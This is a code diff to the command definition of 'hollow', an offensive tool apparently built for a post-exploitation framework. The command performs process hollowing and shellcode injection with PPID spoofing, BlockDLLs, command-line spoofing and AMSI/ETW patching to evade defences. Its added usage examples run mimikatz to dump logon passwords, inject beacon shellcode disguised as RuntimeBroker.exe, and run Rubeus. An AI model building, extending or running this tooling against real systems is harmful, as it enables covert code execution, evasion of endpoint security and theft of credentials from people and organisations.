@@ -1,20 +1,27 @@
 var cmd_hollow = ax.create_command(
     "hollow",
-    "PE hollowing / shellcode injection into sacrificial process. PPID spoof, BlockDLLs, AMSI+ETW patch. Works with managed and unmanaged PEs.",
-    'hollow --pe /opt/Rubeus.exe -a "triage" --timeout 120'
+    "Process hollowing (PE) or shellcode injection into a sacrificial process.\n" +
+    "  PE mode:  NtUnmapViewOfSection + import resolution + relocations + AMSI/ETW patch.\n" +
+    "  SC mode:  VirtualAllocEx + thread hijack + ETW patch.\n" +
+    "  Both:     PPID spoof, BlockDLLs, command-line spoof, output capture.\n" +
+    "  Note:     Native x64 PEs only. For .NET PEs use execute-assembly.",
+    'hollow --pe /opt/Rubeus.exe -a "triage" --timeout 120\n' +
+    'hollow --pe /opt/mimikatz.exe -a "privilege::debug sekurlsa::logonpasswords"\n' +
+    'hollow --sc /opt/beacon.bin -no --spawnto C:\\Windows\\System32\\RuntimeBroker.exe\n' +
+    'hollow --local-pe C:\\Windows\\Temp\\tool.exe -a "/all" --async'
 );
 
-cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "PE file from operator machine (Kali path). Mutually exclusive with --sc and --local-pe");
-cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode file from operator machine. Mutually exclusive with --pe and --local-sc");
-cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH", false, "PE path on the target Windows machine or UNC path");
-cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",   false, "Shellcode path on the target Windows machine");
-cmd_hollow.addArgFlagString("-a",          "ARGS",      false, "Arguments to pass to the PE");
-cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",  false, "Sacrificial process path (default: C:\\Windows\\System32\\svchost.exe)");
-cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",   false, "Timeout in seconds for output capture (default: 60)");
-cmd_hollow.addArgBool("-no",                                    "Do not capture output (fire and forget)");
-cmd_hollow.addArgBool("--no-blockdlls",                         "Disable BlockDLLs mitigation policy");
+cmd_hollow.addArgFlagFile("--pe",       "PE_FILE",     false, "PE file from operator (Kali). Mutually exclusive with --sc, --local-pe, --local-sc");
+cmd_hollow.addArgFlagFile("--sc",       "SC_FILE",     false, "Shellcode file from operator. Mutually exclusive with --pe, --local-pe, --local-sc");
+cmd_hollow.addArgFlagString("--local-pe",  "WIN_PATH", false, "PE on target (local path or UNC)");
+cmd_hollow.addArgFlagString("--local-sc",  "WIN_SC",   false, "Shellcode on target (local path)");
+cmd_hollow.addArgFlagString("-a",          "ARGS",      false, "Arguments passed to the PE (ignored for shellcode)");
+cmd_hollow.addArgFlagString("--spawnto",   "SPAWN_TO",  false, "Sacrificial process (default: svchost.exe)");
+cmd_hollow.addArgFlagInt("--timeout",      "SECONDS",   false, "Output capture timeout in seconds (default: 60)");
+cmd_hollow.addArgBool("-no",                                    "Fire and forget — no output capture");
+cmd_hollow.addArgBool("--no-blockdlls",                         "Disable BlockDLLs (allow non-MS DLLs in child)");
 cmd_hollow.addArgBool("--no-ppid",                              "Disable PPID spoofing");
-cmd_hollow.addArgBool("--async",                                "Run BOF asynchronously");
+cmd_hollow.addArgBool("--async",                                "Run BOF asynchronously (returns immediately)");
 
 cmd_hollow.setPreHook(function(id, cmdline, parsed_json, ...parsed_lines) {
     if (ax.is64(id) == false) { throw new Error("Only x64 targets supported"); }
